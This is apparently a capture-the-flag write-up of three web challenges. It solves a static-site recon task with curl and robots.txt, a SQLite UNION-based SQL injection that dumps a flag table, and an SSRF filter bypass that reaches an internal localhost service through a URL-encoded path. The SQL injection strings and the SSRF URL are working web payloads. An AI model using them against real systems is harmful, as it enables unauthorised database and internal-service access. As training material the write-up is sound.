# Web Challenges

# Web Challenges

### Inspector Gadget

#### Description

While snooping around this website, inspector gadet lost parts of his flag. Can you help him find it?

[inspector-gadget.chal.nbctf.com](https://inspector-gadget.chal.nbctf.com/)

Author: Goodbye

#### Solution

Given website is statically serving html files, different pages can be found from source:

```html
<script>
    function openotherpage() { window.location.href = "Page1.html"; }
    function opengadgetarms() { window.location.href = "gadgetarms.html"; }
    function opengadgetcoat() { window.location.href = "gadgetcoat.html"; }
    function opengadgethat() { window.location.href = "gadgethat.html"; }
    function opengadgetskates() { window.location.href = "gadgetskates.html" }
    function opengadgetcopter() { window.location.href = "gadgetcopter.html" }
    function opengadgetmangifyingglass() { window.location.href="gadgetmag.html" }
    function opengadgetphone() { window.location.href="gadgetphone.html" }
    function getflag() { window.location.href="supersecrettopsecret.txt" }
</script>
```

Visit all urls with not so perfect script and grep:

::: details Curl Grep Flag.sh
```bash
#!/bin/bash

url="https://inspector-gadget.chal.nbctf.com/"
pages=(
  "" # Base URL
  "Page1.html"
  "gadgetarms.html"
  "gadgetcoat.html"
  "gadgethat.html"
  "gadgetskates.html"
  "gadgetcopter.html"
  "gadgetmag.html"
  "gadgetphone.html"
  "supersecrettopsecret.txt"
)

for page in "${pages[@]}"; do 
  page="$url$page"
  echo $page;
  curl -s "$page" | grep "Flag Part" -i -A1 -B1
done;
```
:::

* `<title>Flag Part 1/4:nbctf{G00d_</title>` (gadgetmag.html)
* `Flag Part 2/4: J06_` (supersecrettopsecret.txt)
* `<img src="Krooter Gadget.jpg" alt="Flag Part 3/4: D3tect1v3_">` (index.html)

All that's missing is part 4. Lets check [robots.txt](https://developer.mozilla.org/en-US/docs/Glossary/Robots.txt):

```
User-agent: *
Disallow: /mysecretfiles.html
```

* `part 4/4 G4dg3t352}` (mysecretfiles.html)

::: tip Flag
`nbctf{G00d\_J06\_D3tect1v3\_G4dg3t352}`
:::

### walter's crystal shop

#### Description

My buddy Walter is selling some crystals, check out his shop!

[walters-crystal-shop.chal.nbctf.com](https://walters-crystal-shop.chal.nbctf.com/)\
[walters\_crystal\_shop.zip](https://nbctf.com/uploads?key=46721a897c4888e3414e6bde8f2c7e34c71c8f45f1cb70e6764db9295b2fc728%2Fwalters_crystal_shop.zip)

Author: kroot

#### Solution

Challenge seems to be SQLi, trying the basic payload we get confirmation:

![walters-crystal-shop-1](/assets/ctf/nbctf/walters-crystal-shop-1.png)

Identify columns length: `Citrine' UNION SELECT 1,2,3 --` (Already known, but double check). We see new column with our values.

[PayloadsAllTheThings - SQLite3](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md)

Enumerate tables: `Citrine' UNION SELECT 1,2,group_concat(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%' --`\
Tables: `crystals,flag`

Enumerate `flag` table fields: `Citrine' UNION SELECT 1,2,sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='flag' --`\
Fields: `CREATE TABLE flag (flag TEXT)`

Get the flag: `Citrine' UNION SELECT 1,2,flag from flag --`\


::: tip Flag
`nbctf{h0p3fuLLy\_7h3\_D3A\_d035n7\_kn0w\_ab0ut\_th3\_0th3r\_cRyst4l5}`
:::

### secret tunnel

#### Description

Can you find the flag on the other end of my secret tunnel?

[secret-tunnel.chal.nbctf.com](https://secret-tunnel.chal.nbctf.com/)\
[secret\_tunnel.zip](https://nbctf.com/uploads?key=4154a63752b2a170939e19e12511b6701188d6d7bf490b205d068df3b40c734a%2Fsecret_tunnel.zip)

Author: kroot

#### Solution

Main website: `This magical tunnel allows you to see the first 20 characters of any website! Can you pass through this tunnel and find the flag?`

URL: [https://google.com](https://google.com)\
Response: `<!doctype html><html itemscope="`

In the given source we see 2 apps being ran:

```bash
#!/bin/sh
python3 -m flask --app flag.py run --host=0.0.0.0 --port=1337 & 
python3 -m flask --app main.py run --host=0.0.0.0
```

```py
@app.route("/flag", methods=["GET"])
def index():
    return Response(flag, mimetype="text/plain")
```

Flag app is running locally and is not accessible, if we want the flag we must make a get request to `localhost:1337/flag`.

Filters:

```py
@app.route("/fetchdata", methods=["POST"])
def fetchdata():
    url = request.form["url"]

    if "127" in url:
        return Response("No loopback for you!", mimetype="text/plain")
    if url.count('.') > 2:
        return Response("Only 2 dots allowed!", mimetype="text/plain")
    if "x" in url:
        return Response("I don't like twitter >:(" , mimetype="text/plain") 
    if "flag" in url:
        return Response("It's not gonna be that easy :)", mimetype="text/plain")

    try:
        res = requests.get(url)
    except Exception as e:
        return Response(str(e), mimetype="text/plain")

    return Response(res.text[:32], mimetype="text/plain")
```

* We cant type `127` for `127.0.0.1`, but we can just use `localhost`.
* `.` Prevents IPv4 address.
* `x` No idea.
* `flag` We cant have word `flag` in the url, but we can URLEncode the word and send it that way.

Final URL: `http://localhost:1337/%66%6c%61%67`

::: tip Flag
`nbctf{s3cr3t\_7uNN3lllllllllll!}`
:::
